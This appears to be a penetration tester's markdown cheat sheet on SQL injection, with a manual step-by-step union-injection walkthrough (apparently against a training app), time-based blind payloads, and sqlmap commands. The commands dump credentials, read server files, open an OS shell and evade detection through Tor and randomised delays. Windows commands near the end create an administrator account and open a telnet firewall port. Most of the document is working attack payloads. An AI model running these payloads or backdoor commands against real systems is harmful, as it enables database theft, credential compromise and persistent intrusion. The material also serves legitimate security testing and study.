# SQL Injection

Core Idea: Does the page look like it might need to call on stored data?

There exist some SQLi polyglots, i.e (Mathias Karlsson);

```SQL
SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
```

Works in single quote context, works in double quote context, works in “straight into query” context!

You can also leverage the large database of fuzzlists from Seclists (https://github.com/danielmiessler/SecLists)

##￼￼SQL Injection Observations
Blind is predominant, Error based is highly unlikely.

``
‘%2Bbenchmark(3200,SHA1(1))%2B’
``

``
‘+BENCHMARK(40000000,SHA1(1337))+’
``

SQLMap is king!

- Use -l to parse a Burp log file.
- Use Tamper Scripts for blacklists.
- SQLiPy Burp plugin works well to instrument SQLmap quickly.

Lots of injection in web services!

----------------
## SQL Injection Manually Step by Step

## 1. Determine if SQL injection exists

- Try injecting characters reserved in databases to produce error messages

```SQL
    single-quote
    back-slash
    double-hyphen
    forward-slash
    period
```

- If error message is produces, examine message for helpful errors, queries, database brand, columns, tables or other information.
- If no error message present, send valid data, "true" injections ("or 1=1") and "false" injections ("and 1=0"). Look for difference in the three responses

```SQL
  Technique: Blind SQL Injection - True and False Values
  Field: username
  True Value (Using Proxy): ' or 1=1 --
  False Value (Using Proxy): ' and 1=0 --
```

- If no errors nor differences are produced, try timing attacks ("mysql sleep(), sql server waitfor(), oracle sleep()")

```SQL
    ' union Select null, null, null, sleep(5) --
```

## 2. Determine injection types that work

- UNION statements
  - Determine number of columns in application query. Inject NULL columns until injected query works.
  - Determine position of a varchar or equivalent column
  - Use position of found column(s) to place injected columns. Use NULL for rest
- Inline injection
  - Usually happens when ORDER BY or HAVING clause present in application query
- Timing injection

```SQl
    Technique: Blind SQL Injection - Timing
    Page: login.php
    Field: username
    Value (Using Proxy): ' union Select null, case SUBSTRING(current_user(),1,1) when 'r' THEN sleep(5) ELSE sleep(0) END, null, null --
    Value (Using Direct Request): username=%27%20union%20Select%20null%2C%20case%20SUBSTRING%28current_user%28%29%2C1%2C1%29%20when%20%27r%27%20THEN%20sleep%285%29%20ELSE%20sleep%280%29%20END%2C%20null%2C%20null%20--%20&password=&login-php-submit-button=1
```

## 3. Attempt to determine database server brand

```SQL
Technique: Direct Injection
Page: user-info.php
Field: username
Value (Using Proxy): ' union select null,VERSION() AS username,null,null --
```

## 4. Formulate and test query

## 5. Attempt to determine database name

```SQL
Technique: Direct Injection
Page: user-info.php
Field: username
Value (Using Proxy): ' union select null,DATABASE() AS username,null,null --
```

## 6. Attempt to determine schema name

```SQL
Technique: Direct Injection
Page: user-info.php
Field: username
Value (Using Proxy): ' union select null,table_schema AS username,null,null from INFORMATION_SCHEMA.TABLES--
```

## 7. Attempt to determine table(s) names

```SQL
Technique: Direct Injection
Page: user-info.php
Field: username
Value (Using Proxy): ' union select null,table_schema AS username,table_name AS password,null from INFORMATION_SCHEMA.TABLES--
```

## 8. Attempt to determine column(s) names

```SQL
Technique: Direct Injection
Recon: Extract table columns from database using a single field
Page: user-info.php
Field: Username
Value: ' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS--
```

## 9. Attempt to extract data

```SQL
Technique: Direct Injection
Page: user-info.php
Field: Username
Value: ' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts --
```

## 10. Attempt to read files from server

```SQL
Technique: Direct Injection
Page: user-info.php
Field: username
Value (relative path):
' union select null, LOAD_FILE('../README') AS username, null, null--

Value (absolute path):
' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts') AS username, null, null--
' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\inf\\cpu.inf') AS username, null, null--
```

## 11. Attempt to upload files to server

## 12. Attempt to execute commands. This is easier on SQL Server 2000 and 2005. MySQL has limited system command abilities. SQL Server 2008 disables system commands by default and requires them to be enabled.

## 13. Attempt to determine database computer name, IP address, username, version, etc.

```SQL
MySQL Functions:
VERSION() - MySQL server version
USER() - Database user issuing query
DATABASE() - Database on server against which query is running
```

## 14. Attempt to pivot to database server level. This will largely depend on either being able to execute system commands via the database server or upload files to the file system. Uploading files would allow web application pages to be uploaded which can contain system calls.

---

## Practical Steps for Manual SQLi

### Testing to get a database Error

```sql
> http://blabla.com?id=1\
> http://blabla.com?id=1'
```

### Sql comment to correct the error

```sql
# + is the encode of space
> http://blabla.com?id=1\--+
> http://blabla.com?id=1'#
```

## join queries

### To see how many columns used in this query

```sql
# 3 is our guess for used columns
> http://blabla.com?id=1' order by 3 --+
```

### Reading data from database

```sql
# We usually get the output for one query only,
# So we should get rid of the first query by searching for
# a non exist value like -1
> http://blabla.com?id=-1' union all select 1,2,3 --+
```

### Getting database name and version

```sql
> http://blabla.com?id=-1' union all select 1,database(),version() --+
```

### Getting table name

```sql
# database name = security
> http://blabla.com?id=-1' union all select 1,table_name,3 from information_schema.tables where table_schema='security' --+
```

### Getting all tables names

```sql
# database name = security
> http://blabla.com?id=-1' union all select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
```

### Getting  table columns

```sql
> http://blabla.com?id=-1' union all select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
```

### Dumping all table data

```sql
> http://blabla.com?id=-1' union all select 1,group_concat(username),group_concat(password) from users --+
```

### No quote injection

It is the same as with quote injection but using \ instead of ' for error detection and not using any thing in injection itself

---

## Using SqlMap

```shell
> sqlmap -u URl -data DataToSentInPost -p PARAMETER(id) --level 3 risk 3 -random-agent --tor --check-tor --delay=500 --randomize=delay
```

---

## SQLMAP

## First we try to get which DB is running on the server

```Shell
time sqlmap -r /path/to/request/file.txt --fingerprint
```

### Another syntax

You copy the request with header and body from ZAP/burp and save it to a file then

```Shell
time sqlmap -r /path/to/request/file.txt --fingerprint
```

## Grabbing server banner

```Shell
time sqlmap -r /path/to/request/file.txt --banner
```

## Grabbing current user, current db, host name & is the current user an admin

```Shell
time sqlmap -r /path/to/request/file.txt --current-user --current-db --hostname --is-dba
```

## Grabbing DB users (and passwords is is-dba == true)

```Shell
time sqlmap -r /path/to/request/file.txt --users --passwords
```

## Grabbing DBs

```Shell
time sqlmap -r /path/to/request/file.txt --dbs
```

## Grabbing Tables

```Shell
time sqlmap -r /path/to/request/file.txt -D <db_name> --tables
```

## Grabbing Columns

```Shell
time sqlmap -r /path/to/request/file.txt -D <db_name> -T <table1, table2> --columns
```

## Grabbing data from specific columns

```Shell
time sqlmap -r /path/to/request/file.txt -D <db_name> -T <table_name> -C <column1,column2,column3> --dump
```

Sometimes sqlmap can not find a unique column to figure out how many rows are there,
so the work-around is to sort a column value so sqlmap figure out how many row are there

```Shell
time sqlmap -r /path/to/request/file.txt -D <db_name> -T <table_name> --sql-query="SELECT column4,column7 FROM <db_name>.<table_name> ORDER BY <column4> DESC"
```

OR

```Shell
time sqlmap -r /path/to/request/file.txt --sql-query="SELECT column4,column7 FROM <db_name>.<table_name> ORDER BY <column4> DESC"
```

## Alternative way to get data from a DB

```Shell
time sqlmap -r /path/to/request/file.txt -D <Db_name> --sql-query="SELECT column_name from information_schema.columns where table_name = 'user'"
```

## Adding custom prefix or suffix to the sql query

```Shell
time sqlmap -r /path/to/request/file.txt --prefix="SELSCT * FROM <table_name> WHERE column_name='" --suffix=" -- " --banner
```

## Getting os-shell on the system

```Shell
time sqlmap -r /path/to/request/file.txt --os-shell
```

### Working with O/S Shell

- To see transactions ' tcpdump -i eth1 -vvv -X'

- How O/S Shell works
  - Sqlmap put on the server two files:
    - 1st stage uploader
    - 2nd stage Command Shell Page

- In case of the server is Windows, you can get access through the firewall like that

```Shell
> sc query state= all
> sc query tlnsvr
> sc config tlnserver start= demand
> sc start tlnsvr
> net user root toor /add
> net localgroup TelnetClients /add
> net localgroup Administrators root /add
> net localgroup TelnetClients root /add
> netsh firewall add portopening protocol=TCP port=23 name=telnet mode=enable scope=custom adresses=<your.public.ip.address>
```

- You also can access the command prompt through the webpage like that

http://server.url/<tmp file name>/cmd=ping%20<ip address>

--------------------


##￼Best SQL injection resources

- MySQL:
  - [PentestMonkey's mySQL injection cheat sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
  - [Reiners mySQL injection Filter Evasion Cheatsheet] (https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
- MSQQL:
  - [EvilSQL's Error/Union/Blind MSSQL Cheatsheet] (http://evilsql.com/main/page2.php)
  - [PentestMonkey's MSSQL SQLi injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
- ORACLE:
  - [PentestMonkey's Oracle SQLi Cheatsheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
- POSTGRESQL:
  - [PentestMonkey's Postgres SQLi Cheatsheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
- Others
  - [Access SQLi Cheatsheet] (http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
  - [PentestMonkey's Ingres SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet)
  - [Pentestmonkey's DB2 SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
  - [Pentestmonkey's Informix SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet)
  - [SQLite3 Injection Cheat sheet] (https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
  - [Ruby on Rails (Active Record) SQL Injection Guide] (http://rails-sqli.org/)

